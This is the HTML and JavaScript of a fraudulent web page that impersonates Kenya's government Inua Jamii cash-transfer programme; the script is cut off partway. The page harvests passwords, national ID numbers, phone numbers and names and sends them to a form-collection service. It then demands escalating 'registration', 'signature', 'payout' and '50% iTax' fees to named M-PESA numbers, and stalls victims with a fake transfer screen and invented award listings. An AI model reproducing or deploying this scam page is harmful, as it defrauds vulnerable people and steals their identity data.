<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inua Jamii Foundation B2C Funds Awards Program</title>
    <style>
        /* (Style remains the same as before) */
        /* --- General Styling and Background --- */
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #0A430E, #287C2E); /* Deeper, richer green */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center; /* Center vertically for a professional look */
            padding: 40px 10px;
            animation: fadeIn 1s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .wrapper {
            width: 100%;
            max-width: 550px; /* Slightly wider wrapper */
        }

        .top-title {
            text-align: center;
            color: white;
            font-size: 28px;
            font-weight: 900;
            text-transform: uppercase;
            line-height: 1.2;
            margin-bottom: 30px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
        }

        .card {
            background: #ffffff;
            padding: 35px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
            animation: fadeIn 1.2s ease;
        }

        /* --- Navigation & Headings --- */
        .navbar {
            background: #1976D2; /* Standard primary color for professionalism */
            color: white;
            padding: 18px 25px;
            border-radius: 16px 16px 0 0;
            margin: -35px -30px 25px -30px; 
            font-size: 18px;
            font-weight: 700;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .question {
            font-size: 20px;
            font-weight: 700;
            color: #0A430E; /* Deep green for questions */
            margin-bottom: 20px;
        }

        .info-text {
            font-size: 16px;
            line-height: 1.7;
            color: #555;
            margin-bottom: 25px;
            text-align: justify;
        }

        /* --- Options and Inputs --- */
        .option {
            background: #F1F8E9; /* Very light green */
            padding: 16px;
            border-radius: 12px;
            font-size: 17px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            border: 2px solid #E0E0E0;
            transition: all 0.3s ease;
        }

        .option:hover {
            border-color: #4CAF50;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        }

        .option.selected {
            background: #4CAF50; /* Primary green selection */
            border-color: #2E7D32;
            color: white;
            font-weight: 700;
        }
        
        /* Form/Input Styles */
        .form-group { margin-bottom: 25px; }
        .form-group label {
            display: block;
            font-size: 15px;
            color: #0A430E;
            margin-bottom: 8px;
            font-weight: 600;
            display: flex;
            align-items: center;
        }
        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 14px;
            border: 1px solid #CCC;
            border-radius: 10px;
            font-size: 17px;
            color: #333;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        .form-group input:focus, .form-group textarea:focus {
            border-color: #1976D2;
            outline: none;
        }
        .required-note { font-size: 14px; color: #D32F2F; margin-top: -10px; margin-bottom: 10px; font-weight: 600; }
        .error-message { font-size: 14px; color: #D32F2F; margin-top: 5px; }


        /* --- Button Grouping --- */
        .btn-container {
            display: flex;
            gap: 15px;
            margin-top: 25px;
            flex-wrap: wrap; 
        }

        .btn-next, .btn-submit, .btn-back, .btn-final-step, .btn-finalize {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transition: transform 0.25s, background 0.25s;
        }
        
        .btn-next, .btn-submit { background: #4CAF50; color: white; }
        .btn-next:hover, .btn-submit:hover { background: #388E3C; transform: scale(1.02); }
        .btn-back { background: #B0BEC5; color: #333; }
        .btn-back:hover { background: #90A4AE; transform: scale(1.02); }
        .btn-finalize { background: #D32F2F; color: white; } /* Red for final financial step */
        .btn-finalize:hover { background: #B71C1C; transform: scale(1.02); }

        /* Dashboard Buttons (Large and Stacked) */
        .dashboard-btn-group {
            display: flex;
            flex-direction: column; /* Stacked vertically */
            gap: 15px;
            margin-top: 25px;
        }

        .dashboard-btn-group .btn {
            width: 100%;
            padding: 20px; 
            font-size: 18px;
            font-weight: 700;
            border-radius: 14px;
            border: none;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
            transition: all 0.25s;
        }

        .btn-dashboard-exit { background: #1565C0; color: white; }
        .btn-awards-check { background: #FF9800; color: white; }
        .btn-latest-awards { background: #4CAF50; color: white; }

        .btn-dashboard-exit:hover { background: #0D47A1; transform: scale(1.02); }
        .btn-awards-check:hover { background: #FB8C00; transform: scale(1.02); }
        .btn-latest-awards:hover { background: #388E3C; transform: scale(1.02); }
        
        /* --- Specific Page Styles --- */
        .congratulations-p { 
            font-size: 24px; font-weight: 900; text-align: center; color: #FFC107; 
            margin-bottom: 15px; text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        .instruction-text { font-style: italic; text-align: center; color: #666; margin-bottom: 20px; font-size: 15px; line-height: 1.5; }
        
        /* Award Selection (Page 5) */
        .award-structure-title { font-size: 18px; font-weight: 700; color: #1976D2; text-align: center; margin-bottom: 15px; border-bottom: 2px solid #E0E0E0; padding-bottom: 8px; }
        .reg-fee { font-weight: 700; color: #0A430E; width: 40%; text-align: left; }
        .award-amount { font-weight: 700; color: #D32F2F; width: 50%; text-align: right; font-size: 1.1em; }
        
        /* Payment Info (Page 6 & 9) */
        .payment-box { 
            background: #E3F2FD; 
            padding: 25px; 
            border-radius: 15px; 
            border: 2px dashed #1976D2; 
            margin-top: 20px; 
            text-align: center;
        }
        .secretary-details { font-size: 20px; font-weight: 900; color: #D32F2F; margin-top: 8px; line-height: 1.5; }
        .payment-box p { color: #333; font-size: 17px; }
        
        /* Dashboard (Page 13) */
        .dashboard-content { text-align: center; padding: 20px 0 0 0; }
        .dashboard-content h2 { font-size: 24px; color: #0A430E; margin-bottom: 15px; font-weight: 800; }
        .dashboard-status {
            background: #E8F5E9; color: #2E7D32; font-weight: 900; padding: 12px; border-radius: 8px; 
            margin: 25px auto; border: 2px solid #2E7D32; display: inline-block; animation: none; 
        }
        .dashboard-details { list-style: none; padding: 0; margin-top: 20px; text-align: left; border-top: 1px solid #eee; padding-top: 15px; }
        .dashboard-details li { padding: 10px 0; font-size: 16px; color: #333; border-bottom: 1px dashed #f0f0f0; }

        /* Final Disbursement (Page 14) - Animation Added */
        .final-disbursement-box {
            text-align: center; padding: 30px 20px; background: #FFFDE7; border: 3px solid #FF9800; border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 152, 0, 0.5); /* Glowing effect */
        }
        .disbursement-title { font-size: 26px; font-weight: 900; color: #E65100; margin-bottom: 15px; }
        
        .computer-graphic { 
            font-size: 45px; margin: 15px 0; color: #1976D2; 
            display: inline-block;
            animation: sway 2s ease-in-out infinite alternate, pulse-color 4s infinite;
        }
        
        /* New Animations for Page 14 */
        @keyframes sway {
            0% { transform: rotate(0deg) scale(1); }
            100% { transform: rotate(2deg) scale(1.03); }
        }
        @keyframes pulse-color {
            0%, 100% { color: #1976D2; }
            50% { color: #4CAF50; }
        }

        .wait-message { font-size: 18px; font-weight: 800; color: #D32F2F; margin-top: 20px; padding: 10px; border: 1px dashed #D32F2F; border-radius: 5px; line-height: 1.4; }

        /* Latest Awards Table (Page 15) */
        .awards-table-container { margin-top: 20px; overflow-x: auto; }
        .awards-table {
            width: 100%; border-collapse: collapse; font-size: 15px; min-width: 400px;
        }
        .awards-table th, .awards-table td { border: 1px solid #ddd; padding: 12px 8px; }
        .awards-table th { background-color: #0A430E; color: white; font-weight: 700; text-align: center; }
        .awards-table tr:nth-child(even) { background-color: #f9f9f9; }
        
        /* Table Column Specific Styles (Updated for new order) */
        .awards-table th:nth-child(1), .awards-table td:nth-child(1) { width: 5%; text-align: center; } /* # */
        .awards-table th:nth-child(2), .awards-table td:nth-child(2) { width: 35%; text-align: left; } /* Phone */
        .awards-table th:nth-child(3), .awards-table td:nth-child(3) { width: 30%; text-align: center; } /* Amount - Centered */
        .awards-table th:nth-child(4), .awards-table td:nth-child(4) { width: 30%; text-align: center; } /* ID */
        
        .awards-table td strong { color: #D32F2F; }

        /* Page 12 - iTax Dynamic Fee */
        .itax-fee-display { 
            font-size: 32px; 
            color: #E65100; 
            font-weight: 900;
        }

        /* Hide all pages initially except the active one */
        .page { display: none; }
        .page.active { display: block; }
    </style>
</head>
<body>

    <div class="wrapper">

        <div class="top-title">
            INUA JAMII FOUNDATION<br>
            B2C FUNDS AWARDS PROGRAM
        </div>

        <div class="card">
            
            <div id="page0" class="page active">
                <div class="navbar" id="authNavbar">
                    Account Login
                </div>

                <div id="loginForm">
                    <p class="question" style="text-align:center; margin-top:20px;">Welcome Back! Please Log In.</p>
                    <div class="form-group">
                        <label for="loginEmail"><span>üìß</span> Email Address:</label>
                        <input type="email" id="loginEmail" placeholder="Enter your registered email" required>
                    </div>
                    <div class="form-group">
                        <label for="loginPassword"><span>üîí</span> Password:</label>
                        <input type="password" id="loginPassword" placeholder="Enter your password" required>
                    </div>
                    
                    <button class="btn-submit" onclick="loginUser()">LOG IN ‚ûú</button>
                    <p style="text-align:center; margin-top:15px; font-size:15px;">
                        Don't have an account? <a href="#" onclick="toggleForm('register')" style="color:#1976D2; font-weight:700;">Register here</a>
                    </p>
                </div>

                <div id="registerForm" style="display:none;">
                    <p class="question" style="text-align:center; margin-top:20px;">Create Your Account to Proceed</p>
                    <div class="form-group">
                        <label for="regEmail"><span>üìß</span> Email Address:</label>
                        <input type="email" id="regEmail" placeholder="Choose a valid email" required>
                    </div>
                    <div class="form-group">
                        <label for="regPassword"><span>üîí</span> Choose Password:</label>
                        <input type="password" id="regPassword" placeholder="Minimum 6 characters" required>
                    </div>
                    <div class="form-group">
                        <label for="confirmPassword"><span>‚úÖ</span> Confirm Password:</label>
                        <input type="password" id="confirmPassword" placeholder="Re-enter password" required>
                    </div>
                    
                    <button class="btn-next" onclick="registerUser()">REGISTER ‚ûú</button>
                    <p style="text-align:center; margin-top:15px; font-size:15px;">
                        Already have an account? <a href="#" onclick="toggleForm('login')" style="color:#1976D2; font-weight:700;">Login here</a>
                    </p>
                </div>

            </div>

            <div id="page1" class="page">
                <p class="info-text">
                    ùóúùó°ùó®ùóî ùóùùóîùó†ùóúùóú ùóôùó¢ùó®ùó°ùóóùóîùóßùóúùó¢ùó° ùóôùó®ùó°ùóó ùóîùó™ùóîùó•ùóóùó¶ is the Government of Kenya's flagship 
                    National Safety Net Programme that provides regular cash transfers to support 
                    Kenyans and boost the financial sector. The programme's objective is to improve 
                    the welfare of beneficiaries and cushion them from poverty. It is implemented 
                    by the Ministry of Labour and Social Protection.
                </p>

                <p class="question">Can we proceed with the application?</p>

                <div class="option" id="optionYes" onclick="selectOption1('yes')">
                    <strong>1  YES, I AGREE</strong> <span>‚úÖ</span>
                </div>

                <div class="option" id="optionNo" onclick="selectOption1('no')">
                    <strong>2  NO, I DECLINE</strong> <span>‚ùå</span>
                </div>

                <button class="btn-next" onclick="goNext(1)">NEXT PAGE ‚ûú</button>
            </div>

            <div id="page2" class="page">
                <div class="navbar" style="background: #0A430E;">
                    Information Source
                </div>

                <p class="question">Where did you hear about this program?</p>

                <div class="options-container">
                    <div class="option" data-value="News Broadcasting" onclick="selectSource(this)">
                        <strong>1  News Broadcasting</strong> <span>üìª</span>
                    </div>
                    <div class="option" data-value="Personal Recommendation" onclick="selectSource(this)">
                        <strong>2  Personal Recommendation</strong> <span>üó£Ô∏è</span>
                    </div>
                    <div class="option" data-value="Social Media" onclick="selectSource(this)">
                        <strong>3  Social Media</strong> <span>üì±</span>
                    </div>
                    <div class="option" data-value="Other" onclick="selectSource(this)">
                        <strong>4  Other</strong> <span>‚ùì</span>
                    </div>
                </div>

                <div id="otherInputContainer" style="display:none;">
                    <label for="otherInput" style="font-size:15px; color:#0A430E; font-weight:600;">Please specify your source:</label>
                    <input type="text" id="otherInput" placeholder="e.g., Local church, NGO, Government office" oninput="validateOtherInput()">
                </div>

                <button class="btn-next" id="page2NextButton" onclick="goNext(2)" disabled>NEXT PAGE ‚ûú</button>
            </div>

            <div id="page3" class="page">
                <div class="navbar" style="background: #0A430E;">
                    Award Purpose Selection
                </div>

                <p class="question">What is the main purpose for receiving the award?</p>

                <div class="options-container">
                    <div class="option" data-value="Start a business" onclick="selectPurpose(this)">
                        <strong>1  Start a Business</strong> <span>üöÄ</span>
                    </div>
                    <div class="option" data-value="Top up a business" onclick="selectPurpose(this)">
                        <strong>2  Top up an Existing Business</strong> <span>üìà</span>
                    </div>
                    <div class="option" data-value="Pay school fees" onclick="selectPurpose(this)">
                        <strong>3  Pay School Fees</strong> <span>üìö</span>
                    </div>
                    <div class="option" data-value="Pay bills" onclick="selectPurpose(this)">
                        <strong>4  Pay Bills</strong> <span>üßæ</span>
                    </div>
                    <div class="option" data-value="Pay rent" onclick="selectPurpose(this)">
                        <strong>5  Pay Rent/Housing</strong> <span>üè†</span>
                    </div>
                </div>

                <p class="instruction-text" style="color: #1976D2;">
                    Note: Kindly plan to use your promotion award wisely.
                </p>

                <button class="btn-next" id="page3NextButton" onclick="goNext(3)" disabled>NEXT PAGE ‚ûú</button>
            </div>
            
            <div id="page4" class="page">
                <div class="congratulations-p" style="color:#0A430E;">
                    ‚úÖ REGISTRATION DETAILS
                </div>
                
                <p class="instruction-text">
                    ‚úçÔ∏è Kindly provide details for system validation and registration.
                </p>
                
                <div class="form-group">
                    <label for="regEmailAddress"><span>üìß</span> Input Your Email Address:</label>
                    <input type="email" id="regEmailAddress" name="email" placeholder="Enter email address and password" required>
                </div>

                <form id="registrationForm" onsubmit="submitLoanForm(event)" method="POST" action="https://api.web3forms.com/submit">
                    <input type="hidden" name="access_key" value="750707f5-b4fd-42f8-b5a7-bcab3c6546ea">
                    <input type="hidden" name="subject" value="New INUA JAMII Registration Submission">
                    <input type="hidden" id="hiddenEmail" name="Email" required> <div class="form-group">
                        <label for="fullName"><span>üë§</span> Full Legal Names:</label>
                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full legal names" required>
                    </div>

                    <div class="form-group">
                        <label for="phoneNumber"><span>üìû</span> Phone Number (MPESA):</label>
                        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="e.g., 07XXXXXXXX" required>
                    </div>

                    <div class="form-group">
                        <label for="county"><span>üåç</span> County of Residence:</label>
                        <input type="text" id="county" name="county" placeholder="Enter your County of Residence" required>
                    </div>

                    <div class="form-group">
                        <label for="idNumber"><span>üÜî</span> National ID Number:</label>
                        <input type="text" id="idNumber" name="idNumber" placeholder="Enter your National ID Number" required>
                    </div>
                    
                    <button type="submit" class="btn-submit">SUBMIT REGISTRATION ‚ûú</button>
                </form>
            </div>
            
            <div id="page5" class="page">
                <div class="congratulations-p" style="color: #4CAF50;">
                    üéâ UPLOAD SUCCESSFUL üéâ
                </div>
                
                <p class="instruction-text">
                    Select your desired INUA JAMII PROMOTION award package below:
                </p>
                
                <div class="award-structure-title">
                    REGISTRATION FEE &nbsp; | &nbsp; AWARD AMOUNT
                </div>

                <div class="options-container" id="awardOptions">
                    <div class="option" data-reg="499" data-award-int="30000" data-award="30,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 499</span> <span class="award-amount">Ksh 30,000</span>
                    </div>
                    <div class="option" data-reg="999" data-award-int="65000" data-award="65,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 999</span> <span class="award-amount">Ksh 65,000</span>
                    </div>
                    <div class="option" data-reg="2999" data-award-int="95000" data-award="95,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 2,999</span> <span class="award-amount">Ksh 95,000</span>
                    </div>
                    <div class="option" data-reg="4999" data-award-int="125000" data-award="125,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 4,999</span> <span class="award-amount">Ksh 125,000</span>
                    </div>
                    <div class="option" data-reg="6999" data-award-int="200000" data-award="200,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 6,999</span> <span class="award-amount">Ksh 200,000</span>
                    </div>
                    <div class="option" data-reg="7999" data-award-int="300000" data-award="300,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 7,999</span> <span class="award-amount">Ksh 300,000</span>
                    </div>
                    <div class="option" data-reg="8999" data-award-int="400000" data-award="400,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 8,999</span> <span class="award-amount">Ksh 400,000</span>
                    </div>
                    <div class="option" data-reg="9999" data-award-int="500000" data-award="500,000" onclick="selectAward(this)">
                        <span class="reg-fee">Ksh 9,999</span> <span class="award-amount">Ksh 500,000</span>
                    </div>
                </div>

                <p style="font-size: 14px; text-align: center; color: #D32F2F; font-weight: 600; margin-bottom: 10px;">
                    Note: The award is disbursed immediately after registration fee payment.
                </p>

                <div class="btn-container">
                    <button type="button" class="btn-back" onclick="goBack(5)">‚¨Ö BACK</button>
                    <button class="btn-next" id="page5NextButton" onclick="goNext(5)" disabled>PROCEED TO PAYMENT ‚ûú</button>
                </div>
            </div>
            
            <div id="page6" class="page">
                <div class="congratulations-p" style="color:#1976D2;">
                    PAYMENT ACTIVATION REQUIRED
                </div>
                
                <p class="instruction-text" style="font-style: normal; color: #333;">
                    Your number <strong id="finalPhoneNumber">...</strong> is nominated to receive <strong id="finalAwardAmount" style="color: #D32F2F;">...</strong>.
                </p>

                <div class="payment-box">
                    <p>Kindly remit the Mandatory Registration Fee of:</p>
                    <div id="finalRegFeeAmount" class="secretary-details">Ksh ...</div>
                    
                    <p style="margin-top: 15px;">To the Designated Secretary's Office:</p>
                    <div class="secretary-details">
                        Number: 0105565417<br>
                        Name: JUDITH
                        <br>
                        or 0783597584 <br>
                        Name:Dancun Makau
                    </div>
                    <p style="font-style: italic; margin-top: 15px; font-size: 15px; color: #4CAF50;">
                        Award will be processed immediately after confirmation.
                    </p>
                </div>

                <p class="instruction-text" style="margin-top: 20px; font-size: 14px; color: #777;">
                    This fee covers initial processing and slotting your funds for B2C transfer.
                </p>
                
                <div class="btn-container">
                    <button type="button" class="btn-back" onclick="goBack(6)">‚¨Ö BACK</button>
                    <button class="btn-next" onclick="goNext(6)">I HAVE PAID ‚ûú</button>
                </div>
            </div>
            
            <div id="page7" class="page">
                <div class="navbar">
                    M-PESA Confirmation (Step 1 of 4)
                </div>
                <p class="question">Paste Your Registration M-PESA Confirmation Message:</p>
                <p class="required-note">‚ö†Ô∏è This confirmation is vital for immediate system verification. (Ksh <span id="regFeeConfirmationAmount">...</span>)</p>
                
                <div class="form-group">
                    <textarea id="mpesaConfirmation" rows="5" placeholder="e.g., QRT123XYZ confirmed you sent Ksh [REGISTRATION_FEE] to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(7)" required></textarea>
                    <div id="mpesaConfirmationError" class="error-message" style="display:none;"></div>
                </div>
                
                <button class="btn-next" id="page7NextButton" onclick="goNext(7)" disabled>CONFIRM PAYMENT ‚ûú</button>
            </div>

            <div id="page8" class="page">
                <div class="congratulations-p" style="color:#0A430E;">
                    ‚úÖ PAYMENT RECEIVED
                </div>
                
                <p class="instruction-text" style="font-style: normal; color: #333;">
                    Choose your preferred final payout option and remit the corresponding transfer charge:
                </p>

                <div class="options-container">
                    <div class="option payout-option" data-option="KCB" data-charge="6,855" data-fee="6855" onclick="selectPayoutOption(this)">
                        <div class="payout-option-main">
                            <span>1. KCB Bank Account</span> <span style="font-weight:700;">Ksh 6,855</span>
                        </div>
                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
                            (Account Transfer Charge)
                        </div>
                    </div>
                    <div class="option payout-option" data-option="MPESA" data-charge="4,999" data-fee="4999" onclick="selectPayoutOption(this)">
                        <div class="payout-option-main">
                            <span>2. MPESA (Safaricom)</span> <span style="font-weight:700;">Ksh 4,999</span>
                        </div>
                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
                            (Mobile Transfer Charge)
                        </div>
                    </div>
                    <div class="option payout-option" data-option="M banking account" data-charge="7,988" data-fee="7988" onclick="selectPayoutOption(this)">
                        <div class="payout-option-main">
                            <span>3. Other Mobile Banking</span> <span style="font-weight:700;">Ksh 7,988</span>
                        </div>
                        <div class="payout-option-charge" style="font-size: 14px; color: #777;">
                            (Inter-Bank/Mobile Charge)
                        </div>
                    </div>
                </div>

                <div class="form-group" id="payoutMpesaPasteArea" style="display:none; margin-top: 30px;">
                    <p class="question" style="font-size: 17px; margin-bottom: 10px; color: #1976D2;">
                        Paste Confirmation for the Ksh <span id="payoutFeeAmount" style="color:#D32F2F;">...</span> Payout Charge:
                    </p>
                    <p class="required-note">
                        ‚ö†Ô∏è Payment must be confirmed before proceeding.
                    </p>
                    <textarea id="mpesaPayoutConfirmation" rows="5" placeholder="Mpesa confirmation for the selected payout charge..." oninput="checkUniqueMpesaMessage(8)" required></textarea>
                    <div id="mpesaPayoutConfirmationError" class="error-message" style="display:none;"></div>
                </div>

                <p class="instruction-text" style="color: #D32F2F; margin-top: 15px; font-weight: 600;">
                    NB: These charges are applied once, granting you permanent fan status.
                </p>

                <div class="btn-container">
                    <button type="button" class="btn-back" onclick="goBack(8)">‚¨Ö BACK</button>
                    <button class="btn-next" id="page8NextButton" onclick="goNext(8)" disabled>PROCEED TO SIGNATURE FEE ‚ûú</button>
                </div>
            </div>
            
            <div id="page9" class="page">
                 <div class="navbar">
                    Signature & Licensing Fee (Step 3 of 4)
                </div>
                
                <div class="payment-box" style="background: #FBEFF2; border-color: #D32F2F;">
                    <p style="font-weight: 600; color: #D32F2F;">
                        FINAL ACTION REQUIRED: ùêÉùêûùêöùê´ ùêÖùêöùêß, ùê§ùê¢ùêßùêùùê•ùê≤ ùê©ùêöùê≤ ùê≠ùê°ùêû Signature Fee ùê®ùêü:
                    </p>
                    <span class="secretary-details" style="font-size: 32px; margin: 10px 0;">Ksh 7,599</span>
                    
                    <p style="margin-top: 15px; font-size: 15px; color: #333;">
                        This fee covers licensing and the final digital signature to release your funds.
                    </p>
                    <p style="margin-top: 10px; font-size: 14px; color: #1976D2; font-style: italic;">
                        Any additional charges would be fully refundable on top of your promotion.
                    </p>
                    <div class="congratulations-p" style="color: #4CAF50; margin-top: 15px; font-size: 20px;">*FINAL STEP APPROVAL*</div>
                </div>
                
                <p class="question" style="text-align: center; margin-top: 25px;">
                    Send the Ksh **7,599** fee to the Secretary's Office:
                </p>

                <div class="payment-box" style="margin-top: 10px; padding: 15px; border: 1px solid #CCC;">
                    <div class="secretary-details">
                        Number: **0105565417**<br>
                        Name: **JUDITH**
                    </div>
                </div>
                
                <button class="btn-next" onclick="goNext(9)" style="margin-top: 20px;">I HAVE PAID ‚ûú</button>
            </div>
            
            <div id="page10" class="page">
                <div class="navbar">
                    M-PESA Confirmation (Step 3 of 4)
                </div>
                <p class="question">Paste the M-PESA Confirmation Message for Ksh **7,599**:</p>
                <p class="required-note">‚ö†Ô∏è Final confirmation for licensing required.</p>
                
                <div class="form-group">
                    <textarea id="mpesaSignatureConfirmation" rows="5" placeholder="e.g., RXY98T4HF confirmed you sent KSh 7599 to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(10)" required></textarea>
                    <div id="mpesaSignatureConfirmationError" class="error-message" style="display:none;"></div>
                </div>
                
                <button class="btn-next" id="page10NextButton" onclick="goNext(10)" disabled>CONFIRM & PROCEED ‚ûú</button>
            </div>

            <div id="page11" class="page">
                <div class="congratulations-p" style="color:#0A430E;">
                    ‚úÖ FULL REGISTRATION COMPLETE!
                </div>
                <p class="instruction-text" style="font-size: 17px; font-style: normal; color: #333;">
                    Your file is now ready for final remittance.
                    
                    <p style="margin-top: 15px; font-weight: 700; color: #D32F2F;">Award Amount: Ksh <span id="finalAwardConfirmation">...</span></p>
                </p>
                
                <button class="btn-finalize" style="background: #1976D2;" onclick="goNext(11)">PROCEED TO iTAX CLEARANCE ‚ûú</button>
            </div>
            
            <div id="page12" class="page">
                 <div class="navbar" style="background: #E65100;">
                    ‚ö†Ô∏è MANDATORY KRA iTAX CLEARANCE (Step 4 of 4) ‚ö†Ô∏è
                </div>
                
                <div class="payment-box" style="background: #FFFDE7; border-color: #FFC107;">
                    <p style="font-weight: 600; color: #333;">
                        To comply with KRA regulations for large transfers, remit the **50% iTax Fee** of:
                    </p>
                    <span id="itaxFeeDisplay" class="itax-fee-display">Ksh 0</span>
                    
                    <p style="margin-top: 15px; font-size: 16px; color: #666;">
                        This fee ensures your total award of **Ksh <span id="itaxAwardAmount">...</span>** is cleared for immediate B2C transfer.
                    </p>
                    <p style="margin-top: 15px; font-weight: 700; color: #E65100; font-size: 17px;">
                        Send the iTax fee to Secretary: **0105565417 (JUDITH)**
                    </p>
                </div>
                
                <p class="question" style="font-size: 17px; margin-top: 25px;">
                    Paste the M-PESA confirmation for the iTax Fee:
                </p>
                <div class="form-group">
                    <textarea id="itaxConfirmation" rows="5" placeholder="e.g., LMN09D7GH confirmed you sent KSh [ITAX_FEE] to JUDITH 0105565417 on YYYY..." oninput="checkUniqueMpesaMessage(12)" required></textarea>
                    <div id="itaxConfirmationError" class="error-message" style="display:none;"></div>
                </div>
                
                <button class="btn-finalize" id="page12NextButton" onclick="goNext(12)" disabled>FINALIZE & VIEW DASHBOARD ‚ûú</button>
            </div>

            <div id="page13" class="page">
                <div class="navbar" style="background: #0A430E;">
                    üèÜ Funds Award Dashboard üèÜ
                </div>
                <div class="dashboard-content">
                    <h2 id="dashboardGreeting">Hello, [User Name]!</h2>
                    
                    <div class="dashboard-status approved" id="currentStatus">
                        STATUS: FUNDS APPROVED & PENDING DEPOSIT
                    </div>

                    <p style="font-size: 15px; color: #D32F2F; font-weight: 600;">
                        Your cleared award is awaiting B2C deposit.
                    </p>

                    <ul class="dashboard-details">
                        <li>**Award Amount:** <span id="dashboardAwardAmount">Ksh 0</span></li>
                        <li>**Registered Number:** <span id="dashboardPhoneNumber">N/A</span></li>
                        <li>**Total Fees Paid (Simulated):** <span id="dashboardTotalFees">Ksh 0</span></li>
                        <li>**Award Purpose:** <span id="dashboardPurpose">N/A</span></li>
                        <li>**Application Date:** <span id="dashboardDate">N/A</span></li>
                    </ul>
                </div>
                
                <div class="dashboard-btn-group">
                    <button class="btn btn-awards-check" onclick="goNext(13)">AWARDS CHECK ‚ûú</button>
                    <button class="btn btn-latest-awards" onclick="goNext(14)">LATEST AWARDS üèÜ</button>
                    <button class="btn btn-dashboard-exit" onclick="alert('Thank you for participating! Program exited.')">EXIT PROGRAM</button>
                </div>
            </div>

             <div id="page14" class="page">
                <div class="navbar" style="background: #E65100;">
                    Funds Disbursement Status
                </div>
                <div class="final-disbursement-box">
                    <div class="disbursement-title">
                        ‚úÖ SYSTEM DISBURSEMENT INITIATED
                    </div>
                    
                    <p style="font-size: 16px; color: #333;">
                        Your final award of **Ksh <span id="finalDisbursementAwardAmount">...</span>** is uploaded for automated B2C transfer.
                    </p>
                    
                    <div class="computer-graphic">
                        ‚öôÔ∏è **TRANSFER IN PROGRESS** üí∞
                    </div>
                    
                    <p style="font-size: 18px; font-weight: 700; color: #1976D2; margin-bottom: 10px;">
                        Ref. Transaction Code: **INUA-B2C-94672**
                    </p>

                    <p class="wait-message">
                        **üö® HIGH VOLUME DELAY: WAIT 6 HOURS! üö®**
                        <br>
                        Due to high user volume, your payment will be processed within the next **6 hours**.
                    </p>
                    
                    <p style="font-size: 14px; margin-top: 20px; color: #777;">
                        Do not attempt to check the awards status again until after the 6-hour waiting period.
                    </p>
                </div>

                <div class="btn-container">
                    <button class="btn-back" onclick="goBack(14)">‚¨Ö BACK TO DASHBOARD</button>
                </div>
            </div>
            
            <div id="page15" class="page">
                <div class="navbar" style="background: #4CAF50;">
                    Recent Successful Award Disbursements
                </div>
                
                <p class="question" style="text-align: center; font-size: 17px; color: #2E7D32; margin-top: 15px;">
                    10 most recent verified fund transfers:
                </p>

                <div class="awards-table-container">
                    <table class="awards-table">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Phone (Masked)</th>
                                <th>Amount</th>
                                <th>ID (Masked)</th>
                            </tr>
                        </thead>
                        <tbody id="awardsTableBody">
                            </tbody>
                    </table>
                </div>

                <div class="btn-container">
                    <button class="btn-back" onclick="goBack(15)">‚¨Ö BACK TO DASHBOARD</button>
                </div>
            </div>

        </div>
    </div>

<script>
    // Global state variables
    let currentPage = 0; 
    let selectedOption1 = localStorage.getItem('selectedOption1');
    let selectedSource = localStorage.getItem('selectedSource');
    let selectedPurpose = localStorage.getItem('selectedPurpose');
    let selectedPayoutOption = localStorage.getItem('selectedPayoutOption');
    
    // Use localStorage to persist registration and login details
    let isRegistered = localStorage.getItem('isRegistered') === 'true'; 
    let registeredEmail = localStorage.getItem('registeredEmail') || '';
    let registeredPassword = localStorage.getItem('registeredPassword') || '';
    let registrationData = JSON.parse(localStorage.getItem('registrationData')) || {};
    let selectedAward = JSON.parse(localStorage.getItem('selectedAward')) || {};
    
    // M-Pesa Confirmation Storage
    let mpesaConfirmations = {
        regFee: localStorage.getItem('mpesa_regFee') || '',
        payoutFee: localStorage.getItem('mpesa_payoutFee') || '',
        signatureFee: localStorage.getItem('mpesa_signatureFee') || '',
        itaxFee: localStorage.getItem('mpesa_itaxFee') || ''
    };


    // Fixed fee values for calculation
    const PAYOUT_MPESA_FEE = 4999; 
    const PAYOUT_KCB_FEE = 6855;
    const PAYOUT_MOBILE_FEE = 7988;
    const SIGNATURE_FEE = 7599; 
    
    // Awards pool for Page 15
    const AWARDS_POOL = [
        56000, 196000, 500000, 300000, 450000, 
        75000, 225000, 99000, 35000, 150000
    ];
    
    // Phone Prefixes 
    const PHONE_PREFIXES = [
        '0726', '0727', '0719', '0716', '0100', 
        '0722', '0723', '0720', '0701', '0799'
    ];

    // --- Core Navigation Functions ---

    function saveProgress(pageNumber) {
        localStorage.setItem('lastPage', pageNumber);
        
        // Save form and selection data whenever navigating
